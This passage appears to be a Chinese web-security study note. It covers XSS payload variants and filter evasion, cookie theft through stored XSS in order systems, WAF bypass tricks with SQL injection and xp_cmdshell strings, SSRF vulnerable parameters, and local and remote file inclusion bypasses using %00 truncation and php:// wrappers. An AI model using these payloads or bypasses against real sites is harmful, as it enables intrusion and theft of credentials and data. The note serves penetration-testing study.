href=&quot;javascript:alert(&#x27;xss&#x27;);&quot;&gt;<br><br>&lt;table&gt;标签：可以利用和标签的background属性来引用脚本而不是图像<br>&lt;table background=&quot;javascript:alert(&#x27;xss&#x27;)&quot;&gt;<br>&lt;td background=&quot;javascript:alert(&#x27;xss&#x27;)&quot;&gt;<br><br>&lt;div&gt;标签：类似于&lt;table&gt;和&lt;td&gt;标签可以指定背景，可以嵌入脚本<br>&lt;div style=&quot;background-image:url(javascript:alert(&#x27;xss&#x27;))&quot;&gt;<br>&lt;div style=&quot;width:expression(alert(&#x27;xss&#x27;));&quot;&gt;<br><br>&lt;object&gt;标签：可以用于从外部脚本包含<br>&lt;object type=&quot;text/x-scriptlet&quot; data=&quot;http://test.com/xss.html&quot;&gt;<br></code></pre></td></tr></table></figure>



<h3 id="订单系统的XSS跨站及Shell箱子"><a href="#订单系统的XSS跨站及Shell箱子" class="headerlink" title="订单系统的XSS跨站及Shell箱子"></a>订单系统的XSS跨站及Shell箱子</h3><h4 id="订单系统"><a href="#订单系统" class="headerlink" title="订单系统"></a>订单系统</h4><ul>
<li>在有些订单系统中可以在订单界面寻找到可以插入XSS脚本的文本框（ex：订单留言，订单评价等）</li>
<li>通过注入XSS语句当管理员查看订单时，运行插入的XSS脚本让攻击方获得管理员Cookie等信息</li>
</ul>
<h4 id="Shell箱子"><a href="#Shell箱子" class="headerlink" title="Shell箱子"></a>Shell箱子</h4><p>利用在webshell程序中，植入后门，形成“黑吃黑”，用有后门的木马入侵的网站也就被木马制造者利用。</p>
<h3 id="XSS跨站之HttpOnly绕过"><a href="#XSS跨站之HttpOnly绕过" class="headerlink" title="XSS跨站之HttpOnly绕过"></a>XSS跨站之HttpOnly绕过</h3><h4 id="HttpOnly："><a href="#HttpOnly：" class="headerlink" title="HttpOnly："></a>HttpOnly：</h4><p>如果HTTP响应头中包含HttpOnly标志，只要浏览器支持HttpOnly标志，客户端脚本就无法访问cookie。因此，即使存在跨站点脚本（XSS）缺陷，且用户意外访问利用此漏洞的链接，浏览器也不会向第三方透露cookie。如果浏览器不支持HttpOnly并且网站尝试设置HttpOnly cookie，浏览器会忽略HttpOnly标志，从而创建一个传统的，脚本可访问的cookie。</p>
<h4 id="HttpOnly绕过："><a href="#HttpOnly绕过：" class="headerlink" title="HttpOnly绕过："></a>HttpOnly绕过：</h4><p>可以直接拿账号密码，cookie登录. 浏览器未保存读取密码:需要xss产生于登录地址，利用表单劫持浏览器保存账号面：产生在后台的XSS，例如存储型XSS</p>
<h3 id="XSS跨站之WAF绕过及安全修复"><a href="#XSS跨站之WAF绕过及安全修复" class="headerlink" title="XSS跨站之WAF绕过及安全修复"></a>XSS跨站之WAF绕过及安全修复</h3><h4 id="常规WAF绕过思路"><a href="#常规WAF绕过思路" class="headerlink" title="常规WAF绕过思路"></a>常规WAF绕过思路</h4><ul>
<li><strong>WAF分类：</strong><ul>
<li>云waf在配置云waf时（通常是CDN包含的waf），DNS需要解析到CDN的ip上去，在请求url时，数据包就会先经过云waf进行检测，如果通过再将数据包流给主机。</li>
<li>主机防护软件在主机上预先安装了这种防护软件，可用于扫描和保护主机（废话），和监听web端口的流量是否有恶意的，所以这种从功能上讲较为全面。这里再插一嘴，mod_security、ngx-lua-waf这类开源waf虽然看起来不错，但是有个弱点就是升级的成本会高一些。</li>
<li>硬件ips&#x2F;ids防护、硬件waf使用专门硬件防护设备的方式，当向主机请求时，会先将流量经过此设备进行流量清洗和拦截，如果通过再将数据包流给主机</li>
</ul>
</li>
<li><strong>WAF身份认证阶段绕过： WAF有一个白名单，在白名单内的客户请求将不做检测</strong><ul>
<li>伪造搜索引擎：早些版本的安全狗是有这个漏洞的，就是把User-Agent修改为搜索引擎，便可以绕过，进行sql注入等攻击，这里推荐一个谷歌插件，可以修改User-Agent，叫User-Agent Switcher</li>
<li>伪造白名单特殊目录：360webscan脚本存在这个问题，就是判断是否为admin dede install等目录，如果是则不做拦截,比如GET &#x2F;pen&#x2F;news.php?id&#x3D;1 union select user,password from mysql.user可以改为GET &#x2F;pen&#x2F;news.php&#x2F;admin?id&#x3D;1 union select user,password from mysql.user或者GET &#x2F;pen&#x2F;admin&#x2F;..\news.php?id&#x3D;1 union select user,password from mysql.user</li>
<li>直接攻击源站：这个方法可以用于安全宝、加速乐等云WAF，云WAF的原理通过DNS解析到云WAF，访问网站的流量要经过指定的DNS服务器解析，然后进入WAF节点进行过滤，最后访问原始服务器，如果我们能通过一些手段（比如c段、社工）找到原始的服务器地址，便可以绕过。</li>
</ul>
</li>
<li><strong>WAF数据包解析阶段绕过</strong><ul>
<li>编码绕过最常见的方法之一，可以进行urlencode。</li>
<li>修改请求方式绕过大家都知道cookie中转注入，最典型的修改请求方式绕过，很多的asp，aspx网站都存在这个问题，有时候WAF对GET进行了过滤，但是Cookie甚至POST参数却没有检测。还有就是参数污染，典型例子就是multipart请求绕过，在POST请求中添加一个上传文件，绕过了绝大多数WAF。</li>
<li>复参数绕过例如一个请求是这样的GET &#x2F;test&#x2F;1.PHP?id&#x3D;1 union select user,password from MySQL.user可以修改为GET &#x2F;test&#x2F;1.php?id&#x3D;1&amp;id&#x3D;union&amp;id&#x3D;select&amp;id&#x3D;user,password&amp;id&#x3D;from%20mysql.user很多WAF都可以这样绕</li>
</ul>
</li>
<li><strong>WAF触发规则绕过：WAF在这里主要是针对一些特殊的关键词或者用法进行检测。绕过方法很多，也是最有效的。</strong><ul>
<li>特殊字符替换空格用一些特殊字符代替空格，比如在mysql中%0a是换行，可以代替空格，这个方法也可以部分绕过最新版本的安全狗，在sqlserver中可以用&#x2F;**&#x2F;代替空格</li>
<li>特殊字符拼接把特殊字符拼接起来绕过WAF的检测，比如在Mysql中，可以利用注释&#x2F;**&#x2F;来绕过，在mssql中，函数里面可以用+来拼接,例如GET &#x2F;pen&#x2F;news.php?id&#x3D;1;exec(master..xp_cmdshell ‘net user’)可以改为GET &#x2F;pen&#x2F;news.php?id&#x3D;1; exec(‘maste’+’r..xp’+’_cmdshell’+’”net user”‘)</li>
<li>注释包含关键字在mysql中，可以利用&#x2F;!&#x2F;包含关键词进行绕过，在mysql中这个不是注释，而是取消注释的内容。例如,GET &#x2F;pen&#x2F;news.php?id&#x3D;1 union select user,password from mysql.user可以改为GET &#x2F;pen&#x2F;news.php?id&#x3D;1 &#x2F;!union&#x2F; &#x2F;!select&#x2F; user,password &#x2F;!from&#x2F; mysql.user</li>
</ul>
</li>
</ul>
<h4 id="XSS绕过WAF方法总结"><a href="#XSS绕过WAF方法总结" class="headerlink" title="XSS绕过WAF方法总结"></a>XSS绕过WAF方法总结</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs html">1.script标签可以用于定义一个行内的脚本或者从其他地方加载脚本<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://test.org/x.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>绕过一次过滤的绕过语句：<br>&lt;scr<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">ipt&gt;alert(1)&lt;/scr<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">ipt&gt;</span></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars"></span></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars">2.JavaScript:</span></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&#x27;alert(1)&#x27;</span>&gt;</span> - 在JavaScript代码中当点击后便会被执行，同时还有其他事件（页面加载或者移动鼠标）都可以触法这些事件。尽管大部分会被过滤器过滤，但仍有少量事件未被过滤 — onmouseenter事件：<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">onmouseenter</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span> 当用户鼠标移动到div标签上时便会触发代码</span></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars"></span></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars">3.行内样式(Inlinestyle):</span></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars">可以利用行内样式 IE浏览器支持动态特性</span></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: expression(alert(1))&quot;</span>&gt;</span> - expression后面执行的语句相当于Javascript执行语句</span></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars"></span></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars">4.CSS import:</span></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars">IE浏览器支持在CSS中扩展JavaScript。其中允许加载另一个CSS样式表存在安全问题</span></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span></span></span></span></span><br><span class="language-css"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars"><span class="hljs-keyword">@import</span> url(<span class="hljs-string">&quot;http://test.org/x.css&quot;</span>);</span></span></span></span></span><br><span class="language-css"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars">x.css:</span></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars">body&#123;</span></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars">	color:expression(alert(1));</span></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars">&#125;</span></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars"></span></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars">5.Javascript URL:</span></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars">链接标签里可以通过url中使用JavaScript执行JavaScript代码</span></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</span>link<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars"></span></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars">6.利用字符编码:</span></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars">%c1;alert(/xss/);//</span></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars"></span></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars">7.绕过长度限制:</span></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars">&quot;onclick=alert(1)//</span></span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars">&quot;&gt;<span class="hljs-comment">&lt;!--</span></span></span></span></span><br><span class="hljs-comment"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars">--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1);</span></span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>8.使用标签:<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(navigator.userAgent)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>confirm(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>prompt(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>\u0061\u006c\u0065\u0072\u0074(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>+alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/1/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">data:text/javascript,alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&amp;#100&amp;#97&amp;#116&amp;#97:text/javascript,alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromchacode</span>(<span class="hljs-number">49</span>,<span class="hljs-number">49</span>))</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/1/</span>.<span class="hljs-property">source</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">setTimeout</span>(<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>),<span class="hljs-number">0</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>[<span class="hljs-string">&#x27;write&#x27;</span>](<span class="hljs-number">1</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">anytag</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">alert(1)</span>&gt;</span>M<br><span class="hljs-tag">&lt;<span class="hljs-name">anytag</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">alert(1)</span>&gt;</span>M<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">alert(1)</span>&gt;</span>M<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">alert(1)</span>&gt;</span>M<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert(1)</span>&gt;</span>M<br>&lt;button/onclick=alert(1)&gt;M<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">formaction</span>=<span class="hljs-string">javascript&amp;colon;alert(1)</span>&gt;</span>M<br>&lt;form/action=javascript:alert(1)&gt;&lt;input/type=submit&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onsubmit</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>M<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span>29<br>&lt;body/onload=alert(1)&gt;...<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>9.基于上下文过滤:WAF最大的问题是不能理解内容，使用黑名单可以阻挡独立的js脚本，但仍不能对xss提供足够的保护，如果一个反射型的XSS是下面这种形式<br></code></pre></td></tr></table></figure>



<h2 id="CSRF-SSRF"><a href="#CSRF-SSRF" class="headerlink" title="CSRF-SSRF"></a>CSRF-SSRF</h2><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF:"></a>CSRF:</h3><p>跨站请求伪造（Cross-site request forgery）CSRF是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。当用户访问含有恶意代码的网页时,会向指定正常网站发送非本人意愿的数据请求包（如转账给hack,向hack发送API等）如果此时用户恰好登录了该正常网站（也就是身份验证是正常的）就会执行该恶意代码的请求，从而造成CSRF。</p>
<p>与在XSS章节中提到的在博客里写入获取cookie的代码，在管理员登录后台查看时就会窃取其cookie有异曲同工之妙跟跨网站脚本（XSS）相比，XSS 利用的是<strong>用户对指定网站的信任</strong>，CSRF 利用的是<strong>网站对用户网页浏览</strong>器的信任</p>
<h3 id="SSRF："><a href="#SSRF：" class="headerlink" title="SSRF："></a>SSRF：</h3><p>服务器端请求伪造（Server-Side Request Forgery）SSRF是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。SSRF攻击的目标一般是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
<p> SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p>
<h3 id="常见的漏洞点与关键字"><a href="#常见的漏洞点与关键字" class="headerlink" title="常见的漏洞点与关键字"></a>常见的漏洞点与关键字</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">WEB功能上：<br><br><span class="hljs-number">1</span>）分享：通过<span class="hljs-built_in">URL</span>地址分享网页内容<br><br><span class="hljs-number">2</span>）转码服务：通过<span class="hljs-built_in">URL</span>地址把原地址的网页内容调优使其适合手机屏幕浏览<br><br><span class="hljs-number">3</span>）在线翻译：通过<span class="hljs-built_in">URL</span>地址翻译对应文本内容  ex：百度，有道<br><br><span class="hljs-number">4</span>）图片加载与下载：通过<span class="hljs-built_in">URL</span>地址加载与下载图片<br><br><span class="hljs-number">5</span>）图片 文章收藏功能<br><br><span class="hljs-number">6</span>）未公开的API实现以及其他调用<span class="hljs-built_in">URL</span>的功能<br><br><span class="hljs-built_in">URL</span>中的关键字：【结合谷歌语法找到入手点】 share wap url link src source target u <span class="hljs-number">3</span>g display sourceURL imageURL domain<br></code></pre></td></tr></table></figure>



<h2 id="RCE代码及命令执行漏洞"><a href="#RCE代码及命令执行漏洞" class="headerlink" title="RCE代码及命令执行漏洞"></a>RCE代码及命令执行漏洞</h2><p><img src="/img/12.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="RCE："><a href="#RCE：" class="headerlink" title="RCE："></a>RCE：</h3><p>在 Web 应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口</p>
<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><h3 id="文件包含的作用：将文件以脚本格式执行（根据当前网站脚本类型）"><a href="#文件包含的作用：将文件以脚本格式执行（根据当前网站脚本类型）" class="headerlink" title="文件包含的作用：将文件以脚本格式执行（根据当前网站脚本类型）"></a>文件包含的作用：将文件以脚本格式执行（根据当前网站脚本类型）</h3><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">文件包含脚本代码:</span><br><span class="language-xml"><span class="hljs-comment">&lt;!--#include file=&quot;1.asp&quot; --&gt;</span> ASP - 本地文件</span><br><span class="language-xml"><span class="hljs-comment">&lt;!--#include file=&quot;1.aspx&quot; --&gt;</span> ASPX - 本地文件</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">c:import</span> <span class="hljs-attr">url</span>=<span class="hljs-string">&quot;http://test.one/1.jsp&quot;</span>&gt;</span> C - 远程文件</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">jsp:include</span> <span class="hljs-attr">page</span>=<span class="hljs-string">&quot;1.jsp&quot;</span>&gt;</span> JSP - 本地文件</span><br><span class="language-xml">&lt;%@ include file = &quot;1.jsp&quot;%&gt; 本地文件</span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;test.php&#x27;</span>)<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> PHP - 本地文件</span><br></code></pre></td></tr></table></figure>

<p>文件包含在 php 中，涉及到的危险函数有四个，分别是include()、include_once()、require()、require_once()。</p>
<p>区别如下：</p>
<p>include：包含并运行指定的文件，包含文件发生错误时，程序警告，但会继续执行。</p>
<p>include_once：和 include 类似，不同处在于 include_once 会检查这个文件是否已经被导入，如果已导入，下文便不会再导入，直面 once 理解就是只导入一次。</p>
<p>require：包含并运行指定的文件，包含文件发生错误时，程序直接终止执行。</p>
<p>require_once：和 require 类似，不同处在于 require_once 只导入一次。</p>
<p>在include.php 中有包含函数进行文件调用，将1.txt 内容写成phpinfo()，通过filename&#x3D;1.txt 进行传参，执行phpinfo()。</p>
<h3 id="文件包含漏洞成因与检测及类型"><a href="#文件包含漏洞成因与检测及类型" class="headerlink" title="文件包含漏洞成因与检测及类型"></a>文件包含漏洞成因与检测及类型</h3><ul>
<li>可控变量</li>
<li>文件包含函数</li>
</ul>
<p><strong>可以通过对攻击点进行检测查看是否存在文件包含漏洞：</strong></p>
<ul>
<li>白盒：代码审计</li>
<li>黑盒：漏扫工具 &#x2F; 公开漏洞 &#x2F; 手工查看参数值与功能点</li>
</ul>
<p><strong>文件包含类型</strong></p>
<ul>
<li><p>本地包含：上传图片马 &#x2F; 读取网站源码 &#x2F; 包含日志文件 &#x2F; 包含session文件 &#x2F; 获取服务器信息</p>
</li>
<li><p>远程包含</p>
</li>
<li><p><strong>看对于文件包含类型是否存在限制</strong></p>
<ul>
<li>无限制：代码中没有为包含文件制定特定的前缀或者 .php .html等扩展名</li>
<li>有限制：代码中包含文件制定了特定的前缀或者 .php .html等扩展名，当对其进行攻击时需要对限制的信息进行绕过。</li>
</ul>
</li>
</ul>
<h3 id="文件包含漏洞绕过方法"><a href="#文件包含漏洞绕过方法" class="headerlink" title="文件包含漏洞绕过方法"></a>文件包含漏洞绕过方法</h3><ul>
<li><strong>有限制的绕过方法（与文件上传漏洞绕过方法类似）</strong><ul>
<li>本地包含：<ul>
<li>%00截断：filename&#x3D;1.txt%00.html</li>
<li>长度截断：filename&#x3D;..&#x2F;..&#x2F;..&#x2F;1.txt&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;</li>
</ul>
</li>
<li>远程包含：<ul>
<li><a target="_blank" rel="noopener" href="http://127.0.0.1:8080/include.php?filename=http://www.test.com/1.txt">http://127.0.0.1:8080/include.php?filename=http://www.test.com/1.txt</a> (无限制)</li>
<li><a target="_blank" rel="noopener" href="http://127.0.0.1:8080/include.php?filename=http://www.test.com/1.txt%20">http://127.0.0.1:8080/include.php?filename=http://www.test.com/1.txt%20</a> (有限制)</li>
<li><a target="_blank" rel="noopener" href="http://127.0.0.1:8080/include.php?filename=http://www.test.com/1.txt%23">http://127.0.0.1:8080/include.php?filename=http://www.test.com/1.txt%23</a> (有限制)</li>
</ul>
</li>
</ul>
</li>
<li>伪协议：</li>
</ul>
<table>
<thead>
<tr>
<th align="left">协议</th>
<th>PHP版本</th>
<th>Allow_url_fopen</th>
<th>Allow_url_include</th>
<th align="left">用法</th>
</tr>
</thead>
<tbody><tr>
<td align="left">File:&#x2F;&#x2F;</td>
<td>&gt;&#x3D;5.2</td>
<td>Off&#x2F;on</td>
<td>Off&#x2F;on</td>
<td align="left">?file&#x3D;file:&#x2F;&#x2F;..&#x2F;1.txt</td>
</tr>
<tr>
<td align="left">Php:&#x2F;&#x2F;filter</td>
<td>&gt;&#x3D;5.2</td>
<td>Off&#x2F;on</td>
<td>Off&#x2F;on</td>
<td align="left">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convertbase64-encode&#x2F;resource&#x3D;.&#x2F;index.php</td>
</tr>
<tr>
<td align="left">Php:&#x2F;&#x2F;input</td>
<td>&gt;&#x3D;5.2</td>
<td>Off&#x2F;on</td>
<td>On</td>
<td align="left">?file&#x3D;php:&#x2F;&#x2F;input [POST DATA] <?phpinfo()?></td>
</tr>
<tr>
<td align="left">Zip:&#x2F;&#x2F;</td>
<td>&gt;&#x3D;5.2</td>
<td>Off&#x2F;on</td>
<td>Off&#x2F;on</td>
<td align="left">?file&#x3D;zip:&#x2F;&#x2F;..&#x2F;file.zip%23test.txt</td>
</tr>
<tr>
<td align="left">Compress.bzip2:&#x2F;&#x2F;</td>
<td>&gt;&#x3D;5.2&gt;&#x3D;5.2</td>
<td>Off&#x2F;on</td>
<td>Off&#x2F;on</td>
<td align="left">?file&#x3D;compress.bzip2:&#x2F;&#x2F;..&#x2F;file.bz2</td>
</tr>
<tr>
<td align="left">Compress.zlib:&#x2F;&#x2F;</td>
<td>&gt;&#x3D;5.2</td>
<td>Off&#x2F;on</td>
<td>Off&#x2F;on</td>
<td align="left">?file&#x3D;compress.zlib:&#x2F;&#x2F;..&#x2F;file.gz</td>
</tr>
<tr>
<td align="left">Data:&#x2F;&#x2F;</td>
<td>&gt;&#x3D;5.2</td>
<td>On</td>
<td>On</td>
<td align="left">?file&#x3D;data:&#x2F;&#x2F;test&#x2F;plain,<?phpinfo()?></td>
</tr>
</tbody></table>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">当PHP 的配置选项 allow_url_include、allow_url_fopen 状态为 ON 的话，则<span class="hljs-meta">include</span>/<span class="hljs-meta">require</span> 函数是可以加载远程文件的，这种漏洞被称为远程文件包含漏洞<br></code></pre></td></tr></table></figure>



<h2 id="文件下载漏洞"><a href="#文件下载漏洞" class="headerlink" title="文件下载漏洞"></a>文件下载漏洞</h2><p><img src="/img/13.png" srcset="/img/loading.gif" lazyload></p>
